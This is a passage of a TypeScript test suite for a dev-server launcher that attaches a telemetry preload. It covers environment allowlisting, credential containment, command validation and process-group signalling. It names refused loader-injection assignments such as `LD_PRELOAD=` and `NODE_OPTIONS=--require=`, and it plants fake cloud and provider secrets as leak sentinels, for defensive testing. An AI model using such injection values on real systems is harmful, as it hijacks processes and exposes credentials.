/**
 * Tests for `./launcher.ts`: the dev-server launcher that starts a developer's
 * own dev server with the Debug Generator telemetry preload attached — and
 * nothing else changed — and owns each launched child's credential, lifetime
 * and shutdown.
 *
 * The folder brief names this suite's core in one sentence: *assert the
 * `NODE_OPTIONS` append semantics and the four injected variables without
 * actually spawning Next.js.* Everything else here follows from what those
 * two contracts protect.
 *
 * - **Append, never replace (invariant 1).** A developer's `NODE_OPTIONS` may
 *   already carry heap limits, an inspector or their own `--import` hook.
 *   Clobbering it breaks their environment in a way that looks like a bug in
 *   their app, so `appendNodeOptions` is pinned token by token, including its
 *   idempotence and its treatment of an unrelated `--import`.
 * - **A minimal environment plus exactly four variables (the named
 *   requirement).** A launched child's environment is the service variables on
 *   `DEV_SERVER_ENV_ALLOWLIST`, the launch command's explicit `NAME=value`
 *   assignments that `DEV_SERVER_COMMAND_ENV_ALLOWLIST` admits, and
 *   `NODE_OPTIONS`, `DEBUGGEN_INGEST_URL`, `DEBUGGEN_TOKEN` and
 *   `DEBUGGEN_PROJECT_ROOT` — nothing else. The key set is computed from
 *   the module's own `PRELOAD_ENV_KEYS` and `isForwardedToDevServer`, so the
 *   suite cannot drift from the contract it checks, and a service environment
 *   holding the model-provider key and other service-only credentials proves
 *   none of them reaches the child. A loader, preload or wiring-key
 *   assignment (`LD_PRELOAD=`, `NODE_OPTIONS=--require=`, `DEBUGGEN_TOKEN=`)
 *   is refused before anything is minted.
 * - **Only a dev server runs (CWE-78).** `spawn(…, { shell: false })` decides
 *   how a program starts, never which one, so `checkLaunchCommand` is pinned
 *   form by form: a package-manager run of a dev-server script, `next dev`,
 *   or the service's Node running a trusted `node_modules/next/dist/bin/next`,
 *   each with only the allowlisted Next.js dev options and no positional —
 *   and every shell, runner, interpreter, other script, directory, option and
 *   untrusted `NODE_PATH` refused with nothing minted or spawned.
 * - **The token is a capability (invariant 2).** A `server-agent` credential
 *   (AAP §0.5.6) lives in the child's `DEBUGGEN_TOKEN` and nowhere else: not in
 *   `NODE_OPTIONS`, a log record, an error's message, hint or details, a
 *   registry record or a launch result.
 * - **Child output is digested, never kept (CWE-532).** A dev server prints
 *   source frames, SQL literals, query values and its echoed environment, so
 *   no line of it reaches a log record or an error: only per-stream counts
 *   and a closed set of diagnostic ids do. Sentinels planted in a child's
 *   output are searched for across every log record and error surface.
 * - **Reversible by construction (AAP §0.5.1).** This path instruments through
 *   the environment only; the fixture project's directory is snapshotted
 *   before and after a full launch/stop cycle and must be byte-identical.
 * - **Graceful failure (AAP §0.5.5).** A missing preload, an un-preloaded
 *   server already on the port, an address another process holds, a missing
 *   binary, an early exit, a readiness timeout and an address that answered
 *   but never identified itself each become a distinct typed `Err` with an
 *   actionable hint, and none leaves a live child or an unrevoked credential
 *   behind.
 * - **Readiness is verified, never read from output.** A loopback URL the
 *   child prints is a candidate only right after a serving-address label
 *   (`Local:`, `url:`, `listening on`, `running at`…); it is ready only once a
 *   probe answers *and* the operating system shows every listener on that
 *   port held by the launched child's process tree. A Next.js response
 *   header or a connected `server-agent` identifies nothing. The harness's
 *   default probe answers — with the Next.js signature — where a live fake
 *   child printed its address, and its default listener-ownership double
 *   confirms exactly the ports a live fake child printed, the way a real dev
 *   server holds the port it announces.
 * - **Ownership is the operating system's answer.** `createListenerOwnership`
 *   is exercised for real on Linux (`/proc`, with genuine loopback listeners
 *   on ephemeral ports) and through injected filesystems and command outputs
 *   for the Linux fallbacks, macOS/POSIX (`lsof` + `ps`) and Windows
 *   (PowerShell).
 * - **A recycled group id is never signalled (CWE-367).** After a leader
 *   exits, its group is signalled only while a listing still holds a member
 *   pinned (pid and start time) while the leader lived; a recycled, gone or
 *   unlistable group is left alone and logged. `createProcessGroupInspector`
 *   is exercised on the real `/proc` and through injected `/proc` and `ps`
 *   doubles.
 *
 * Five habits in here are deliberate.
 *
 * 1. **No real dev server, and no child process outside one suite.** Every
 *    launch drives the injected `SpawnLike` port with a `FakeChild`;
 *    detection, probing, listener ownership and the credential issuer are
 *    injected doubles. No launch dials a socket or execs a binary, and a
 *    `signalProcessGroup` is injected only together with a process-table
 *    double that records the signal (the process-group identity suite), so a
 *    fake pid is never signalled — or looked up — on the host. The one
 *    exception is the Linux `createListenerOwnership` suite, which spawns
 *    `process.execPath` listeners bound to `127.0.0.1:0`, kills each one it
 *    spawned in `afterEach`, and gives every one a self-exit deadline
 *    besides; the real-`/proc` case of `createProcessGroupInspector` only
 *    reads.
 * 2. **Filesystem only under `os.tmpdir()`.** Fixture projects and the fake
 *    preload live in `mkdtemp` sandboxes removed in `afterEach`; nothing is
 *    written into the repository or `~/.debuggen`.
 * 3. **Credential fixtures are assembled at runtime.** `scripts/check-secrets.mjs`
 *    scans this tracked file, so every planted token is joined from short,
 *    low-entropy fragments and a deterministic suffix; none is a literal.
 * 4. **Generic vocabulary only.** Fixture projects, scripts and paths use
 *    invented names that belong to no demo application, which is what keeps
 *    the generalization acceptance test (AAP §0.8.4) honest.
 * 5. **Time is driven, never waited on.** Every timeout, poll and grace period
 *    is exercised under Vitest's fake timers, restored in `afterEach`, and the
 *    suites that use them assert that no timer is left pending.
 *
 * @module
 */

import { Buffer } from 'node:buffer';
import { spawn as spawnProcess } from 'node:child_process';
import type { ChildProcess } from 'node:child_process';
import { EventEmitter } from 'node:events';
import {
  chmodSync,
  chownSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { createServer } from 'node:http';
import type { Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

import { afterEach, describe, expect, it, vi } from 'vitest';
import type { Mock } from 'vitest';

import {
  AUTHORIZATION_HEADER,
  HTTP_OPERATIONS,
  HTTP_ROUTES,
  PROTOCOL_VERSION,
  buildPath,
  devServerCredentialRequestSchema as protocolCredentialRequestSchema,
  devServerCredentialResponseSchema as protocolCredentialResponseSchema,
  devServerLaunchResponseSchema,
  formatBearer,
} from '@debuggen/protocol';
import {
  DEBUGGEN_ERROR_CODES,
  DebuggenError,
  createConsoleLogger,
  err,
  isErr,
  isOk,
  ok,
} from '@debuggen/shared';
import type { DebuggenErrorCode, LogRecord, Logger, Result } from '@debuggen/shared';
import { sha256Hex } from '@debuggen/shared/node';

import { loadServiceConfig } from '../config.js';
import { createAuthService } from '../server/auth.js';
import type { AuthService, AuthServiceDeps, Principal } from '../server/auth.js';
import { openStore } from '../store/db.js';

import { LOG_FAILURE_NOTICE_MESSAGE } from '../logging.js';
import {
  FRAMEWORK_DEV_CLIS,
  buildRelaunchHint,
  detectDevServer,
  formatRelaunchCommand,
  packageManagerRunArgs,
} from './detect.js';
import type {
  DevScriptSelection,
  DevServerDetection,
  DevServerFramework,
  DevServerProbeResult,
  FetchLike,
  KnownPackageManagerId,
  ServerAgentPresence,
} from './detect.js';
import {
  CLI_CREDENTIAL_CHECK_INTERVAL_MS,
  CLI_CREDENTIAL_DISCONNECT_GRACE_MS,
  DEFAULT_CLI_CREDENTIAL_LEASE_MS,
  DEFAULT_LISTENER_LOOKUP_TIMEOUT_MS,
  DEFAULT_MANAGED_CREDENTIAL_LEASE_MS,
  DEFAULT_READY_PROBE_TIMEOUT_MS,
  DEV_SERVER_ARGUMENT_ALLOWLIST,
  DEV_SERVER_COMMAND_ENV_ALLOWLIST,
  DEV_SERVER_CREDENTIAL_METHOD,
  DEV_SERVER_CREDENTIAL_PATH,
  DEV_SERVER_ENV_ALLOWLIST,
  DEV_SERVER_OUTPUT_DIAGNOSTICS,
  LAUNCH_NODE_OPTIONS_ALLOWLIST,
  LEASE_RENEWALS_PER_LEASE,
  MAX_READY_CANDIDATES,
  PRELOAD_BUILD_COMMAND,
  PRELOAD_BUNDLED_RELATIVE_URL,
  PRELOAD_ENV_KEYS,
  PRELOAD_PACKAGE_SPECIFIER,
  PRELOAD_WORKSPACE_RELATIVE_PATH,
  REVOCATION_RETRY_INITIAL_MS,
  addressedServerAgentPresence,
  appendNodeOptions,
  buildDevServerEnv,
  buildPreloadImportFlag,
  buildWindowsCommandInvocation,
  checkLaunchAssignment,
  checkLaunchCommand,
  createDevServerLauncher,
  createListenerOwnership,
  createProcessGroupInspector,
  devServerCredentialInputSchema,
  devServerCredentialResponseSchema,
  diagnoseOutputLine,
  isAllowedLaunchAssignment,
  isForwardedToDevServer,
  isTrustedDevCliFile,
  isTrustedNodePathDirectory,
  parseLaunchCommand,
  preloadPathCandidates,
  resolveIngestUrl,
  resolvePreloadPath,
  resolveWindowsComSpec,
  serverAgentCredentialIssuer,
  toDevServerLaunchResponse,
} from './launcher.js';
import type {
  AcceptedLaunchCommand,
  ChildProcessLike,
  DevServerLaunchInput,
  DevServerLauncher,
  DevServerLauncherDeps,
  DevServerOutputDiagnostic,
  LaunchCommandContext,
  LaunchedDevServer,
  ListenerOwnership,
  ListenerOwnershipCommandOptions,
  ListenerOwnershipCommandOutcome,
  ListenerOwnershipFs,
  ListenerOwnershipRunCommand,
  ManagedDevServerLaunch,
  ParentEnvironment,
  ProcessGroupInspector,
  ProcessIdentity,
  ServerAgentConnections,
  ServerAgentCredential,
  ServerAgentCredentialIssueInput,
  ServerAgentConnectionView,
  ServerAgentCredentialIssuer,
  SignalProcessGroup,
  SpawnLike,
  SpawnOptionsLike,
} from './launcher.js';

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

/** The service's bound address in every launch: loopback and a bound port. */
const SERVICE_CONFIG = Object.freeze({ host: '127.0.0.1', port: 43117 });

/** The platform every launch assumes unless a test says otherwise: POSIX semantics. */
const POSIX: NodeJS.Platform = 'linux';

/** The platform whose environment names compare case-insensitively. */
const WINDOWS: NodeJS.Platform = 'win32';

/** A fixed clock reading (epoch milliseconds, mid-2025), so every timestamp is exact. */
const FIXED_NOW = 1_750_000_000_000;

/** Where a fake child says it serves; never the service's own port. */
const DEV_ORIGIN = 'http://127.0.0.1:4173';

/** The same address in the `origin/` form readiness records. */
const DEV_URL = `${DEV_ORIGIN}/`;

/** The pid the first fake child receives; later children count up from it. */
const FIRST_PID = 7_301;

/** The dev script every default detection selects. Generic, and not named `dev`. */
const DEFAULT_SCRIPT: DevScriptSelection = Object.freeze({
  name: 'start:local',
  command: 'next dev --port 4173',
});

/** The fixture project's manifest: a generic Next.js application pinned to pnpm. */
const FIXTURE_MANIFEST = Object.freeze({
  name: 'atlas-console',
  private: true,
  packageManager: 'pnpm@9.15.0',
  scripts: { [DEFAULT_SCRIPT.name]: DEFAULT_SCRIPT.command, lint: 'eslint .' },
  devDependencies: { next: '16.3.5' },
});

/** A representative developer environment: flags already in `NODE_OPTIONS`, an OTel switch, a hole. */
const PARENT_ENV: ParentEnvironment = Object.freeze({
  PATH: '/usr/local/bin:/usr/bin:/bin',
  HOME: '/home/dev',
  LANG: 'en_US.UTF-8',
  NODE_ENV: 'development',
  NEXT_OTEL_VERBOSE: '1',
  NODE_OPTIONS: '--max-old-space-size=4096 --require ./tracing-shim.cjs',
  UNSET_BY_SHELL: undefined,
});

/** The four variable names, from the module's own contract (never restated). */
const INJECTED_KEYS: readonly string[] = Object.values(PRELOAD_ENV_KEYS);

// ---------------------------------------------------------------------------
// Runtime-assembled credential fixtures (habit 3)
// ---------------------------------------------------------------------------

/** The lower-case Latin alphabet, assembled rather than written out. */
const LOWER_ALPHABET = Array.from({ length: 26 }, (_, offset) =>
  String.fromCharCode('a'.charCodeAt(0) + offset),
).join('');

/**
 * A deterministic pseudo-random suffix (Park–Miller). The products stay below
 * 2^53, so the sequence is exact and the suite reproducible.
 */
function pseudoRandomSuffix(seed: number, length: number): string {
  let state = seed;
  let suffix = '';
  for (let index = 0; index < length; index += 1) {
    state = (state * 48_271) % 2_147_483_647;
    suffix += LOWER_ALPHABET.charAt(state % LOWER_ALPHABET.length);
  }
  return suffix;
}

/** The fixed suffix every planted credential carries, so a leak is unmistakable. */
const CREDENTIAL_SUFFIX = pseudoRandomSuffix(97, 10);

/**
 * The `index`-th planted credential: distinctive enough that its appearance in
 * any output is a leak, and plainly not a real provider key.
 */
function fixtureCredential(index: number): string {
  return ['launcher', 'suite', 'credential', String(index), CREDENTIAL_SUFFIX].join('-');
}

/** A URL embedding `user:password@`, built by concatenation. */
function urlWithUserInfo(host: string): string {
  return 'http://' + ['someone', pseudoRandomSuffix(13, 8)].join(':') + '@' + host + '/';
}

/** A service-only secret value, labelled by kind; plainly not a real key. */
function fixtureSecret(kind: string): string {
  return [kind, 'service', 'only', CREDENTIAL_SUFFIX].join('-');
}

/**
 * A service environment holding both what a target app needs and what it
 * must never see: the model-provider key, service-only `DEBUGGEN_*`
 * configuration, the editor's variables, a package manager's config, cloud
 * and source-control credentials and an unrecognised variable — beside the
 * database and port the end-to-end suites depend on reaching the launched app.
 */
const SERVICE_ENV: ParentEnvironment = Object.freeze({
  ...PARENT_ENV,
  DATABASE_URL: 'postgresql://127.0.0.1:5432/atlas_console',
  PORT: '4173',
  DEBUGGEN_LOG_LEVEL: 'debug',
  LC_ALL: 'en_US.UTF-8',
  http_proxy: 'http://127.0.0.1:3128',
  ANTHROPIC_API_KEY: fixtureSecret('provider'),
  DEBUGGEN_HOME: '/home/dev/.debuggen',
  DEBUGGEN_PROVIDER: 'deterministic',
  DEBUGGEN_MODEL: 'configured-model',
  DEBUGGEN_PORT: '43117',
  VSCODE_IPC_HOOK: '/run/user/1000/vscode-ipc.sock',
  ELECTRON_RUN_AS_NODE: '1',
  npm_config_registry: 'https://registry.example.test/',
  AWS_SECRET_ACCESS_KEY: fixtureSecret('cloud'),
  GITHUB_TOKEN: fixtureSecret('scm'),
  UNRECOGNISED_TOOL_SETTING: 'on',
});

/** The {@link SERVICE_ENV} names a launched child must never receive. */
const SERVICE_ONLY_NAMES: readonly string[] = [
  'ANTHROPIC_API_KEY',
  'DEBUGGEN_HOME',
  'DEBUGGEN_PROVIDER',
  'DEBUGGEN_MODEL',
  'DEBUGGEN_PORT',
  'VSCODE_IPC_HOOK',
  'ELECTRON_RUN_AS_NODE',
  'npm_config_registry',
  'AWS_SECRET_ACCESS_KEY',
  'GITHUB_TOKEN',
  'UNRECOGNISED_TOOL_SETTING',
];

/** The {@link SERVICE_ENV} names a launched child must receive unchanged. */
const FORWARDED_NAMES: readonly string[] = [
  'PATH',
  'HOME',
  'LANG',
  'NODE_ENV',
  'NEXT_OTEL_VERBOSE',
  'DATABASE_URL',
  'PORT',
  'DEBUGGEN_LOG_LEVEL',
  'LC_ALL',
  'http_proxy',
];

// ---------------------------------------------------------------------------
// Result and error helpers
// ---------------------------------------------------------------------------

/** The value of an `Ok`, or a test failure naming the `Err` that arrived instead. */
function expectOk<T>(result: Result<T, DebuggenError>): T {
  if (isErr(result)) {
    throw new Error(
      `expected Ok, received Err(${result.error.code}): ${result.error.message} — ${result.error.hint ?? ''}`,
    );
  }
  return result.value;
}

/**
 * The error of an `Err`, asserted to be a `DebuggenError` with a registered
 * code — the expected one — and, when given, the expected `details.reason`.
 */
function expectErr<T>(
  result: Result<T, DebuggenError>,
  code: DebuggenErrorCode,
  reason?: string,
): DebuggenError {
  if (isOk(result)) {
    throw new Error(`expected Err(${code}), received Ok: ${JSON.stringify(result.value)}`);
  }
  expect(result.error).toBeInstanceOf(DebuggenError);
  expect(DEBUGGEN_ERROR_CODES).toContain(result.error.code);
  expect(result.error.code).toBe(code);
  if (reason !== undefined) {
    expect(reasonOf(result.error)).toBe(reason);
  }
  return result.error;
}

/** The `DebuggenError` a call throws; a test failure when it throws nothing or something else. */
function thrownBy(action: () => unknown): DebuggenError {
  let caught: unknown;
  try {
    action();
  } catch (error) {
    caught = error;
  }
  if (caught instanceof DebuggenError) {
    expect(DEBUGGEN_ERROR_CODES).toContain(caught.code);
    return caught;
  }
  throw new Error(`expected a DebuggenError to be thrown, got ${String(caught)}`);
}

/** The machine-readable reason an error carries in its details. */
function reasonOf(error: DebuggenError): unknown {
  return error.details?.['reason'];
}

/** Every textual surface of an error a developer, a log or a wire payload could see. */
function errorSurfaces(error: DebuggenError): string {
  return JSON.stringify({ message: error.message, hint: error.hint, details: error.details });
}

// ---------------------------------------------------------------------------
// Logging, sandboxes and snapshots
// ---------------------------------------------------------------------------

/** A logger whose records land in an array instead of the console. */
function recordingLogger(): { readonly logger: Logger; readonly records: LogRecord[] } {
  const records: LogRecord[] = [];
  const logger = createConsoleLogger({
    level: 'trace',
    sink: (record) => {
      records.push(record);
    },
  });
  return { logger, records };
}

/** Every record as text: message and fields, the whole surface a log sink receives. */
function serializedRecords(records: readonly LogRecord[]): string {
  return JSON.stringify(
    records.map((record) => ({ message: record.message, fields: record.fields })),
  );
}

const sandboxes: string[] = [];

/** A fresh directory under `os.tmpdir()`, removed after the test. */
function makeSandbox(label: string): string {
  const directory = mkdtempSync(join(tmpdir(), `debuggen-launcher-${label}-`));
  sandboxes.push(directory);
  return directory;
}

/** A fixture project: a sandbox holding nothing but its `package.json`. */
function makeProject(label = 'project'): string {
  const root = makeSandbox(label);
  writeFileSync(join(root, 'package.json'), `${JSON.stringify(FIXTURE_MANIFEST, null, 2)}\n`);
  return root;
}

/**
 * A stand-in for the built preload, in the VSIX layout
 * (`dist/telemetry/node/register.mjs`) of its own sandbox — never inside a
 * fixture project, which must stay untouched.
 */
function makePreload(): string {
  const directory = join(makeSandbox('toolchain'), 'dist', 'telemetry', 'node');
  mkdirSync(directory, { recursive: true });
  const preloadPath = join(directory, 'register.mjs');
  writeFileSync(preloadPath, '// inert stand-in for the telemetry preload\n');
  return preloadPath;
}

/** Every entry below `root` with each file's content, sorted: a byte-exact picture of a tree. */
function snapshotTree(root: string): string[] {
  return readdirSync(root, { recursive: true, encoding: 'utf8' })
    .sort()
    .map((relative) => {
      const absolute = join(root, relative);
      return statSync(absolute).isFile()
        ? `${relative}\n${readFileSync(absolute, 'utf8')}`
        : `${relative}/`;
    });
}

/** A promise and the function that settles it. */
interface Deferred<T> {
  readonly promise: Promise<T>;
  readonly resolve: (value: T) => void;
}

function deferred<T>(): Deferred<T> {
  let resolve: (value: T) => void = () => undefined;
  const promise = new Promise<T>((settle) => {
    resolve = settle;
  });
  return { promise, resolve };
}

// ---------------------------------------------------------------------------
// The fake child process (habit 1)
// ---------------------------------------------------------------------------

/** How one fake child behaves. */
interface ChildPlan {
  /** Its pid; `null` models a spawn that failed before a process existed (`ENOENT`). */
  readonly pid?: number | null;
  /** The signals it exits on. Default: both `SIGTERM` and `SIGKILL`. */
  readonly exitsOn?: readonly NodeJS.Signals[];
  /** Whether `kill` throws, as it does for a process that vanished without an exit event. */
  readonly killThrows?: boolean;
  /**
   * Whether `kill` reports delivery. `false` models Node's answer for a signal
   * it did not deliver (`EPERM`, a vanished process): `kill` returns `false`
   * and the child does not exit. Default `true`.
   */
  readonly killDelivers?: boolean;
}

/**
 * A `ChildProcessLike` the test drives by hand: it prints, exits and fails
 * only when told to, and records every signal it is sent. `stdout` and
 * `stderr` are plain emitters, which is all the launcher's `ReadableLike`
 * slice reads.
 */
class FakeChild extends EventEmitter implements ChildProcessLike {
  readonly pid: number | undefined;
  exitCode: number | null = null;
  readonly stdout = new EventEmitter();
  readonly stderr = new EventEmitter();
  /** Every signal `kill` was called with, in order. */
  readonly signals: NodeJS.Signals[] = [];
  readonly #exitsOn: ReadonlySet<NodeJS.Signals>;
  readonly #killThrows: boolean;
  /** Everything the child printed, on either stream — what "listening" means for a fake. */
  #printed = '';
  readonly #killDelivers: boolean;
  #exited = false;

  constructor(pid: number | undefined, plan: ChildPlan) {
    super();
    this.pid = pid;
    this.#exitsOn = new Set(plan.exitsOn ?? ['SIGTERM', 'SIGKILL']);
    this.#killThrows = plan.killThrows === true;
    this.#killDelivers = plan.killDelivers !== false;
  }

  /** Whether the child has reported its exit. */
  get exited(): boolean {
    return this.#exited;
  }

  /**
   * Whether this child "listens" at `url`: it is still running and has
   * printed that URL's origin. The harness's default probe answers — with
   * the Next.js signature — exactly there, the way a real dev server answers
   * at the address it announced.
   */
  listensAt(url: string): boolean {
    return !this.#exited && this.#printed.includes(new URL(url).origin);
  }

  /**
   * Whether this child "holds the listener" on `port`: it is still running
   * and printed an `http(s)://host:<port>` address. The harness's default
   * listener-ownership double confirms exactly these ports for this pid.
   */
  holdsPort(port: number): boolean {
    if (this.#exited) {
      return false;
    }
    return [...this.#printed.matchAll(/https?:\/\/[\w.:[\]-]+/g)].some((match) => {
      try {
        return Number(new URL(match[0]).port) === port;
      } catch {
        return false;
      }
    });
  }

  kill(signal: NodeJS.Signals = 'SIGTERM'): boolean {
    this.signals.push(signal);
    if (this.#killThrows) {
      throw Object.assign(new Error('kill ESRCH'), { code: 'ESRCH' });
    }
    if (!this.#killDelivers) {
      return false;
    }
    if (this.#exitsOn.has(signal)) {
      this.finish(null, signal);
    }
    return true;
  }

  /** Write `text` to one of the child's output streams, as bytes. */
  print(text: string, stream: 'stdout' | 'stderr' = 'stdout'): void {
    this.#printed += text;
    this[stream].emit('data', Buffer.from(text, 'utf8'));
  }

  /** Report the child's exit, once. */
  finish(code: number | null, signal: NodeJS.Signals | null): void {
    if (this.#exited) {
      return;
    }
    this.#exited = true;
    this.exitCode = code;
    this.emit('exit', code, signal);
  }

  /** Report a failed spawn the way Node does: an `error` event carrying an errno code. */
  failToSpawn(code: string): void {
    this.emit('error', Object.assign(new Error(`spawn ${code}`), { code }));
  }
}

/** A `SpawnLike` spy that hands out planned `FakeChild`ren and lets a test await each one. */
class SpawnRecorder {
  readonly children: FakeChild[] = [];
  readonly spawn: Mock<SpawnLike>;
  readonly #waiters = new Map<number, Deferred<FakeChild>>();

  constructor(plans: readonly ChildPlan[] = []) {
    this.spawn = vi.fn<SpawnLike>(() => {
      const index = this.children.length;
      const plan = plans[index] ?? {};
      const child = new FakeChild(
        plan.pid === null ? undefined : (plan.pid ?? FIRST_PID + index),
        plan,
      );
      this.children.push(child);
      this.#waiter(index).resolve(child);
      return child;
    });
  }

  /** The `index`-th child, as soon as it is spawned. */
  child(index = 0): Promise<FakeChild> {
    return this.#waiter(index).promise;
  }

  /** The arguments of the `index`-th spawn call. */
  call(index = 0): {
    readonly command: string;
    readonly args: readonly string[];
    readonly options: SpawnOptionsLike;
  } {
    const call = this.spawn.mock.calls[index];
    if (call === undefined) {
      throw new Error(`spawn #${String(index)} was never called`);
    }
    const [command, args, options] = call;
    return { command, args, options };
  }

  #waiter(index: number): Deferred<FakeChild> {
    let waiter = this.#waiters.get(index);
    if (waiter === undefined) {
      waiter = deferred<FakeChild>();
      this.#waiters.set(index, waiter);
    }
    return waiter;
  }
}

// ---------------------------------------------------------------------------
// The credential issuer, detection and probe doubles
// ---------------------------------------------------------------------------

type IssueFn = ServerAgentCredentialIssuer['issue'];
type RenewFn = ServerAgentCredentialIssuer['renew'];
type RevokeFn = ServerAgentCredentialIssuer['revoke'];
type DetectFn = NonNullable<DevServerLauncherDeps['detect']>;
type ProbeFn = NonNullable<DevServerLauncherDeps['probe']>;
type OwnsListenerFn = ListenerOwnership['ownsListener'];

/** A credential issuer double: planted tokens out, every call recorded. */
interface FakeIssuer {
  readonly credentials: ServerAgentCredentialIssuer;
  readonly issue: Mock<IssueFn>;
  readonly renew: Mock<RenewFn>;
  readonly revoke: Mock<RevokeFn>;
  /** Every token issued, in order. */
  readonly tokens: string[];
}

/**
 * The issuer the access boundary would be: each call mints the next planted
 * credential with a `cred-<n>` handle, unless `answer` decides otherwise.
 */
function createIssuer(
  answer?: (
    input: ServerAgentCredentialIssueInput,
    token: string,
    index: number,
  ) => Result<ServerAgentCredential, DebuggenError>,
): FakeIssuer {
  const tokens: string[] = [];
  const issue = vi.fn<IssueFn>((input) => {
    const index = tokens.length + 1;
    const token = fixtureCredential(index);
    tokens.push(token);
    return answer === undefined
      ? ok({ token, credentialId: `cred-${String(index)}` })
      : answer(input, token, index);
  });
  const renew = vi.fn<RenewFn>(() => ok(true));
  const revoke = vi.fn<RevokeFn>(() => undefined);
  return { credentials: { issue, renew, revoke }, issue, renew, revoke, tokens };
}

/** What a fake detection reports; every member optional. */
interface DetectionFacts {
  readonly running?: boolean;
  readonly preloadAttached?: boolean;
  readonly devServerUrl?: string;
  readonly packageManager?: DevServerDetection['packageManager'];
  /** The selected script; `null` for a project without one. */
  readonly devScript?: DevScriptSelection | null;
  /**
   * The project's dev-server script names; `null` for a manifest that was
   * not read. Default: the fixture manifest's dev-server scripts plus the
   * selected one.
   */
  readonly devServerScripts?: readonly string[] | null;
}

/**
 * The `FIXTURE_MANIFEST` scripts that start a dev server — the ones whose
 * command runs `next dev`, as `./detect.js` classifies them; `lint` is not one.
 */
const FIXTURE_DEV_SERVER_SCRIPTS: readonly string[] = Object.freeze([DEFAULT_SCRIPT.name]);

/**
 * The dev-server script names detection reports by default: the fixture's
 * plus the selected one, code-unit sorted as `./detect.js` reports them.
 */
function defaultDevServerScripts(devScript: DevScriptSelection | undefined): readonly string[] {
  const names = new Set(FIXTURE_DEV_SERVER_SCRIPTS);
  if (devScript !== undefined) {
    names.add(devScript.name);
  }
  return Object.freeze([...names].sort());
}

/**
 * A complete, internally consistent `DevServerDetection`, with the relaunch
 * command and hint composed by `./detect.js` itself — so an assertion on the
 * launcher's hint compares against the real wording, never a copy of it.
 */
function detectionFor(
  projectRoot: string,
  preloadPath: string,
  facts: DetectionFacts = {},
): DevServerDetection {
  const running = facts.running ?? false;
  const preloadAttached = running && (facts.preloadAttached ?? false);
  const packageManager = facts.packageManager ?? 'pnpm';
  const devScript = facts.devScript === null ? undefined : (facts.devScript ?? DEFAULT_SCRIPT);
  const devServerScripts =
    facts.devServerScripts === null
      ? undefined
      : (facts.devServerScripts ?? defaultDevServerScripts(devScript));
  const draft: DevServerDetection = {
    projectRoot,
    ...(facts.devServerUrl === undefined ? {} : { devServerUrl: facts.devServerUrl }),
    running,
    preloadAttached,
    preloadReason: !running
      ? 'not-running'
      : preloadAttached
        ? 'server-agent-connected'
        : 'no-server-agent-connection',
    packageManager,
    packageManagerSource: packageManager === 'unknown' ? 'unknown' : 'manifest-field',
    ...(devScript === undefined ? {} : { devScript }),
    ...(devServerScripts === undefined ? {} : { devServerScripts }),
    relaunchCommand: formatRelaunchCommand({
      projectRoot,
      packageManager,
      devScript,
      preloadUrl: pathToFileURL(preloadPath).href,
      ingestUrl: resolveIngestUrl(SERVICE_CONFIG),
    }),
    relaunchHint: '',
    canLaunch: !running && devScript !== undefined,
    notes: [],
  };
  return Object.freeze({ ...draft, relaunchHint: buildRelaunchHint(draft) });
}

/**
 * A probe result for `url`: reachable (any HTTP status) or refused. A
 * reachable answer carries the Next.js signature when `framework` is given —
 * the evidence that identifies a launched child — and none otherwise, like an
 * unrelated process holding the address.
 */
function probeAnswer(
  url: string,
  reachable: boolean,
  framework?: DevServerFramework,
): Result<DevServerProbeResult, DebuggenError> {
  return ok(
    reachable
      ? {
          url,
          reachable: true,
          status: 200,
          ...(framework === undefined ? {} : { framework }),
          durationMs: 3,
        }
      : {
          url,
          reachable: false,
          durationMs: 1,
          error: {
            code: 'ECONNREFUSED',
            message: 'Connection refused: nothing is listening at this address.',
          },
        },
  );
}

/**
 * A probe that answers at each listed origin — with the Next.js signature
 * (`'next'`) or without one (`'unsigned'`, like a process that is not a
 * framework dev server) — and refuses everywhere else.
 */
function scriptedProbe(
  answers: Readonly<Record<string, DevServerFramework | 'unsigned'>>,
): ProbeFn {
  return (url) => {
    const answer = answers[new URL(url).origin];
    return Promise.resolve(
      answer === undefined
        ? probeAnswer(url, false)
        : probeAnswer(url, true, answer === 'unsigned' ? undefined : answer),
    );
  };
}

/**
 * A listener-ownership answer by port — `true` (the child's tree holds it),
 * `false` (another process does) or `undefined` (the lookup cannot tell) —
 * for whatever pid is asked; a port not listed is `false`.
 */
function ownershipByPort(verdicts: Readonly<Record<number, boolean | undefined>>): OwnsListenerFn {
  return (_rootPid, port) =>
    Promise.resolve(Object.hasOwn(verdicts, port) ? verdicts[port] : false);
}

/** The port of an `http(s)://host:port` origin, as a number. */
function portOf(origin: string): number {
  return Number(new URL(origin).port);
}

// ---------------------------------------------------------------------------
// The launcher harness
// ---------------------------------------------------------------------------

/** Options of {@link createHarness}; every member optional. */
interface HarnessOptions {
  /** The facts the injected detection reports. Ignored when `detect` is given. */
  readonly detection?: DetectionFacts;
  /** A detection implementation to inject instead of the fact-driven double. */
  readonly detect?: DetectFn;
  /**
   * The readiness probe. Default: an address a spawned, still-running child
   * printed answers with the Next.js signature ({@link FakeChild.listensAt});
   * every other URL refuses. Nothing ever dials a socket.
   */
  readonly probe?: ProbeFn;
  /**
   * The listener-ownership port's answer. Default: `true` exactly when a
   * spawned, still-running child with that pid printed an address on that
   * port ({@link FakeChild.holdsPort}), else `false` — the way the operating
   * system attributes a real dev server's listener to its process tree.
   */
  readonly ownership?: OwnsListenerFn;
  /** The behaviour of each spawned child, by spawn order. */
  readonly children?: readonly ChildPlan[];
  /** The issuer double. Default: {@link createIssuer}'s. */
  readonly issuer?: FakeIssuer;
  /** The environment children inherit. Default: {@link PARENT_ENV}. */
  readonly parentEnv?: ParentEnvironment;
  /** The fixture project. Default: a fresh {@link makeProject}. */
  readonly projectRoot?: string;
  /** Any further collaborator or setting, applied last. */
  readonly deps?: Partial<DevServerLauncherDeps>;
}

/** A launcher wired to doubles, with every double exposed for assertions. */
interface Harness {
  readonly launcher: DevServerLauncher;
  readonly projectRoot: string;
  readonly preloadPath: string;
  readonly spawner: SpawnRecorder;
  readonly issuer: FakeIssuer;
  readonly detect: Mock<DetectFn>;
  readonly probe: Mock<ProbeFn>;
  readonly ownership: Mock<OwnsListenerFn>;
  readonly records: LogRecord[];
